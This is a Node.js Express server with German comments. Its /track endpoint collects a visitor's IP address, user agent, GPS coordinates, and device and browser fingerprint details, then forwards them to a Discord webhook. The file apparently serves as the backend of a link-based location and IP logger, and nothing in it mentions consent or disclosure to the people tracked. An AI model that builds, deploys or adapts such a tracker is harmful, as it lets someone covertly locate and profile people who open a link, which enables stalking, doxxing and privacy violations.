// server.js — nur Discord, keine DB, KEINE IP-Geolocation
const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

app.set('trust proxy', true);
app.use(express.json());

// Static
const publicDir = path.join(__dirname, 'public');
app.use(express.static(publicDir));

// Health + Root
app.get('/health', (_, res) => res.send('ok'));
app.get('/', (_, res) => res.sendFile(path.join(publicDir, 'index.html')));

const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

// echte Client-IP (nur Infozweck)
function getClientIp(req) {
  const xf = req.headers['x-forwarded-for'] || req.headers['x-real-ip'];
  if (xf) return String(xf).split(',')[0].trim().replace(/^::ffff:/, '');
  return (req.socket?.remoteAddress || '').replace(/^::ffff:/, '');
}

// Track – NUR Browser-Signale nutzen (keine IP-Geo)
app.get('/track', async (req, res) => {
  const ip = getClientIp(req);
  const userAgent = req.headers['user-agent'] || '';
  const timestamp = new Date().toISOString();

  // alles kommt aus dem Query (vom HTML)
  const {
    request_id, lat, lon, accuracy, geo_status,
    language, languages, cookies, screen, window: win,
    timezone, platform, hardwareConcurrency, deviceMemory,
    connection, referrer
  } = req.query;

  // Location NUR aus Browser (wenn vorhanden)
  const hasGPS = lat && lon;
  const locationText = hasGPS
    ? `Lat, Lon: ${lat}, ${lon}${accuracy ? ` (±${accuracy} m)` : ''}`
    : '–';

  const embeds = [{
    title: 'Tracking-Daten (nur Browserdaten)',
    color: 0x2b90d9,
    fields: [
      { name: 'Request ID', value: String(request_id || '–'), inline: true },
      { name: 'IP (Info)', value: String(ip || '–'), inline: true },
      { name: 'User-Agent', value: (userAgent || '–').slice(0, 256), inline: false },
      { name: 'Zeitzone', value: String(timezone || '–'), inline: true },
      { name: 'Referrer', value: String(referrer || '–'), inline: false },
      { name: 'Geo Permission', value: String(geo_status || 'unbekannt'), inline: true },
      { name: 'Language(s)', value: String(language || languages || '–').slice(0, 256), inline: true },
      { name: 'Platform', value: String(platform || '–'), inline: true },
      { name: 'HW / RAM', value: `Cores: ${hardwareConcurrency || '–'} | RAM: ${deviceMemory || '–'}`, inline: true },
      { name: 'Screen', value: String(screen || '–').slice(0, 256), inline: false },
      { name: 'Window', value: String(win || '–').slice(0, 256), inline: false },
      { name: 'Netz', value: String(connection || '–').slice(0, 256), inline: false },
      { name: 'Location (GPS)', value: locationText, inline: false },
    ],
    timestamp
  }];

  if (DISCORD_WEBHOOK_URL) {
    try {
      await axios.post(DISCORD_WEBHOOK_URL, {
        content: `📡 **Neuer Track** — ${timestamp}`,
        embeds
      }, { timeout: 5000 });
    } catch (e) {
      console.error('Discord-Webhook-Fehler:', e.response?.status, e.response?.data || e.message);
    }
  } else {
    console.warn('Kein DISCORD_WEBHOOK_URL gesetzt – überspringe Discord-Post.');
  }

  res.send('Daten empfangen');
});

app.listen(port, () => console.log(`Server läuft auf Port ${port}`));




